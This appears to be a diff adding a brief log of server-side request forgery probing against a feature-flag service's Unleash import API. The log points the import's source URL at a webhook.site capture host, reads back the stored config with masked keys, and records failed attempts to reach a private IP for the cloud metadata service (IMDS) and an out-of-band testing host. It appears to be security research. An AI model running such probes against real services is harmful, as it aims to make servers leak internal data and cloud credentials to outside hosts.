@@ -1,0 +1,16 @@
+### 1. trigger unleash import #1 (webhook.site sourceBaseUrl)
+trigger -> 201 ""
+
+### 2. read import config status after trigger
+GET -> 200 {"_links": {"self": {"href": "/api/v2/integration-capabilities/flag-import/default/unleash/87fd93d6-82de-4da2-b940-d417051fcaae", "type": "application/json"}, "parent": {"href": "/api/v2/integration-capabilities/flag-import", "type": "application/json"}, "project": {"href": "/api/v2/projects/default", "type": "application/json"}}, "_id": "87fd93d6-82de-4da2-b940-d417051fcaae", "integrationKey": "unleash", "projectKey": "default", "config": {"ldApiKey": "**********", "ldMaintainer": "6ac28fd11c28fb07516cf363", "ldTag": "imported-from-unleash", "sourceApiKey": "**********", "sourceBaseUrl": "https://webhook.site/9ed8f3c2-fcda-4e20-b554-3c02c62321a3/unleash-api", "sourceEnvironmentId": "e", "sourceProjectId": "p", "sourceTag": ""}, "tags": [], "name": "", "version": 2, "_access": {"denied": [
+
+### 3. create unleash import #2 pointing at PRIVATE IP (IMDS)
+create -> 400 {"code": "invalid_request", "message": "unknown field \"projectKey\""}
+id2: None
+
+### 4. unleash import #3 via OAST direct (Burp visibility)
+create -> 400
+id3: None
+
+### 5. custom-approvals via /api/v2/integrations/{key}
+create -> 404 {"code": "not_found", "message": "Integration \"custom-approvals\" not found"}
